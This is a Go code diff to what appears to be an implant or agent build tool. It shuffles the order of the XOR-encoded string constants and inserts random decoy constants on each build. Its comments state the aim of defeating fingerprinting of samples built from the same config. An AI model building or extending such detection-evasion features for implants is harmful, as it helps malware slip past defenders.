@@ -5,6 +5,7 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"fmt"
+	"math/big"
 	"regexp"
 	"strings"
 )
@@ -62,6 +63,33 @@ func encodeSConst(plain string) ([]byte, error) {
 	return []byte(hex.EncodeToString(key) + ":" + base64.StdEncoding.EncodeToString(data)), nil
 }
 
+// shuffleStrings shuffles s in place using crypto/rand.
+func shuffleStrings(s []int) {
+	for i := len(s) - 1; i > 0; i-- {
+		n, err := rand.Int(rand.Reader, big.NewInt(int64(i+1)))
+		if err != nil {
+			continue
+		}
+		j := int(n.Int64())
+		s[i], s[j] = s[j], s[i]
+	}
+}
+
+// randomDecoyName returns a random unused S* identifier for honeypot constants.
+func randomDecoyName() string {
+	const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, 8)
+	for i := range b {
+		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
+		if err != nil {
+			b[i] = letters[0]
+			continue
+		}
+		b[i] = letters[n.Int64()]
+	}
+	return "SDecoy" + string(b)
+}
+
 // randomizeStrxor regenerates the agent string table with a fresh random XOR
 // key per constant. The template's build tag, package imports and runtime
 // functions are preserved verbatim; the const values are re-encoded and the
@@ -97,7 +125,15 @@ func randomizeStrxor() ([]byte, error) {
 	var b strings.Builder
 	b.WriteString(header)
 	b.WriteString("const (\n")
-	for _, m := range matches {
+	// Shuffle declaration order every build so const layout is not a stable
+	// fingerprint across samples built from the same config.
+	order := make([]int, len(matches))
+	for i := range order {
+		order[i] = i
+	}
+	shuffleStrings(order)
+	for _, idx := range order {
+		m := matches[idx]
 		// SConfigKey is a var (declared outside the const block) and is set
 		// per build via -ldflags -X main.SConfigKey; never re-emit it as a
 		// const, or the linker override would be silently ignored.
@@ -113,6 +149,29 @@ func randomizeStrxor() ([]byte, error) {
 			return nil, fmt.Errorf("encode %s: %w", m[1], err)
 		}
 		b.WriteString("\t" + m[1] + strings.Repeat(" ", maxName-len(m[1])) + ` = "` + string(enc) + `"` + "\n")
+	}
+	// Honeypot decoys: a few random unused S* constants per build so the
+	// table size and symbol set also vary. Unused constants are legal in Go
+	// and are stripped from the binary, but they perturb source-level and
+	// debug-info fingerprints when garble is off.
+	decoys := 3
+	if n, err := rand.Int(rand.Reader, big.NewInt(6)); err == nil {
+		decoys = 3 + int(n.Int64()) // 3-8 decoys
+	}
+	for i := 0; i < decoys; i++ {
+		plain := make([]byte, 8)
+		if _, err := rand.Read(plain); err != nil {
+			break
+		}
+		enc, err := encodeSConst(string(plain))
+		if err != nil {
+			break
+		}
+		name := randomDecoyName()
+		if len(name) > maxName {
+			maxName = len(name)
+		}
+		b.WriteString("\t" + name + strings.Repeat(" ", maxName-len(name)) + ` = "` + string(enc) + `"` + "\n")
 	}
 	b.WriteString(")\n\n")
 	b.WriteString(runtime)
